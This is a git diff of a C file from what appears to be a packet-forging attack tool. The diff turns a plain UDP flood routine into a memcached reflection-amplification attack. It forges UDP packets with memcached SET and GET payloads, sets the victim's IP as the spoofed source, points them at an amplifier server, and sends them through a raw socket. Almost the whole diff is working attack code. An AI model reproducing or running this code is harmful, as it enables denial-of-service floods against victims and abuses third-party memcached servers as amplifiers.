@@ -1,3 +1,4 @@
+#include <arpa/inet.h>
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/socket.h>
@@ -5,9 +6,9 @@
 #include <netinet/ip.h>
 #include <signal.h>
 #include "c.h"
-#include "PacketForge.h"
+#include "packetforge.h"
+#include "memcached.h"
 #include "strix.h"
-
 
 volatile sig_atomic_t stop = 1;
 
@@ -17,27 +18,8 @@ static void sigint_handler( int signum )
   fprintf(stdout, "\nShutdown signal received\n");
 }
 
-static void 
-attack( Packet * pkt )
-{
-  signal(SIGINT, sigint_handler);
-  
-  //Precisamos inserir os dados no memcached antes de iniciar o ataque
-  while( likely(stop) ){
-    send_packet( pkt ); 
-  }
-}
-
-void 
-executeAttackPlan( AttackPlan * plan )
-{
-  Packet * pkt = forgeUDP("192.168.0.145", "192.168.0.1", 6666);
-  attack( pkt );
-  release_packet( pkt );
-}
-
 /*Code inspired on t50 */
-int 
+static int 
 create_socket( void )
 {
   int fd, flag;
@@ -72,7 +54,7 @@ create_socket( void )
 }
 
 /* Taken from t50 */
-void 
+static void 
 close_socket( int fd)
 {
   /* Close only if the descriptor is valid. */
@@ -85,17 +67,60 @@ close_socket( int fd)
   }
 }
 
-bool 
-send_packet( Packet * pkt)
+static void 
+attack( AttackData * data )
 {
-  assert(NULL != pkt);
+  struct sockaddr_in sin;
+  int socket = -1;
+  
+  assert( data != NULL );
+  
+  signal(SIGINT, sigint_handler);
+  
+  socket = create_socket();
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(data->atkPlan->target_port);
+  sin.sin_addr.s_addr = inet_addr(data->atkPlan->target_ip);
 
-
-  if( unlikely( sendto(pkt->socket, pkt->packet_ptr, pkt->size, MSG_NOSIGNAL, (struct sockaddr *)&pkt->sin, sizeof(struct sockaddr_in)) == -1 ) ){
-    return false;
+  //Precisamos inserir os dados no memcached antes de iniciar o ataque
+  if( unlikely( sendto(socket, data->setPacket->packet_ptr, data->setPacket->size, MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) == -1 ) ){
+    close_socket( socket );
+    warning("Socket Error");
   }
 
-  return true;
+  //do{
+    if( unlikely( sendto(socket, data->getPacket->packet_ptr, data->getPacket->size, MSG_NOSIGNAL, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) == -1 ) ){
+      close_socket( socket );
+      warning("Scoket error"); 
+    }
+  //}while( likely(stop));
+
+  close_socket( socket );
 }
+
+void 
+executeAttack( AttackPlan * plan )
+{
+  AttackData * atkData;
+  Packet * memcachedPkt;
+
+  memalloc( (void *)&atkData, sizeof( AttackData ), __func__);
+  
+  atkData->atkPlan = plan;
+   
+  memcachedPkt = forgeMemcached(  SET );
+  atkData->setPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);
+
+  memcachedPkt = forgeMemcached(  GET );
+  atkData->getPacket = forgeUDP(plan->target_ip, plan->amp_ip, plan->target_port, plan->amp_port, memcachedPkt->packet_ptr, memcachedPkt->size);
+
+  attack( atkData );
+
+  release_packet( &atkData->setPacket);
+  release_packet( &atkData->getPacket);
+  free( atkData );
+  
+}
+
 
 
